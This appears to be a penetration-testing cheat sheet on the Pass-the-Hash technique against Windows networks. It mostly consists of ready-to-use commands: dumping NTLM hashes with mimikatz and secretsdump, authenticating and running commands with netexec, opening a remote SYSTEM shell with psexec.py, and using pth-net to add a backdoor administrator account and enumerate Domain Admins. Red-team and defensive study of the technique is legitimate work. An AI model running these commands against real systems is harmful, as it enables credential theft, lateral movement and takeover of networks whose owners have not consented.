**Pass the Hash** (PtH) is a post-exploitation technique that allows attackers to authenticate to systems without needing plaintext credentials. Instead, attackers use the **hashed version** of a password directly to access resources. This is possible due to weak authentication protocols, primarily in Windows environments, which validate hashes rather than plaintext passwords.

---

## Key Concepts

- **Hash Authentication**: Many Windows services accept NTLM hashes as authentication without verifying the plaintext password.
- **Hash Retrieval**: Hashes are extracted from memory, SAM databases, or network traffic using tools like Mimikatz or secretsdump.
- **Lateral Movement**: Attackers use the retrieved hashes to access additional systems, escalating their control within the network.

--- 

## Obtain Hashes

- Extract NTLM hashes from a compromised system using tools like:

```bash
mimikatz sekurlsa::logonpasswords
```

Or dump hashes from the SAM database:

```bash
secretsdump.py <target_user>@<target_ip>
```

## Use Hashes to authenticate

#### Using netexec

| Option        | Description                                                |
| ------------- | ---------------------------------------------------------- |
| `<target_ip>` | Target machine's IP address.                               |
| `<username>`  | User account.                                              |
| `<NTLM_hash>` |  Hash (format: `<LM_Hash>:<NT_Hash>` or just `<NT_Hash>`). |

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash>
```

**Check for Administrative Access**: To see if the hash provides administrative privileges:

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash> --admin
```

**Execute Commands**: If administrative access is confirmed, you can execute commands:

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash> -x "whoami"
```

#### Using PsExec

**PsExec** is a Microsoft Sysinternals tool (and also a technique replicated by Impacket and Metasploit modules) that allows remote command execution via SMB.  
With PtH, it can authenticate using **NTLM hashes** instead of passwords.

```bash
psexec.py <domain>/<username>@<target_ip> -hashes <LM_Hash>:<NT_Hash>
```
- `-hashes` allows direct use of NTLM hashes.

- If the account is a local or domain admin, this spawns a remote SYSTEM shell.


---

## Pth-net 

`pth-net` is a modified version of the Windows `net.exe` command that supports hash-based authentication, allowing attackers to interact with remote systems without knowing the plaintext password.

**Common Usage:**

- Creates a new local user named `eviluser` with the password `Passw0rd!`.
```bash
pth-net user add <username> <password> /add
```

- Adds the newly created user to the local Administrators group.
```bash
pth-net localgroup administrators eviluser /add
```

- Lists members of the Domain Admins group in a domain environment.
```bash
pth-net group "Domain Admins" /domain
```

- Establishes a connection to the IPC$ share using NTLM hash authentication.
```bash
pth-net use \\target\IPC$ /user:<domain>\<username> <NTLM_hash>
```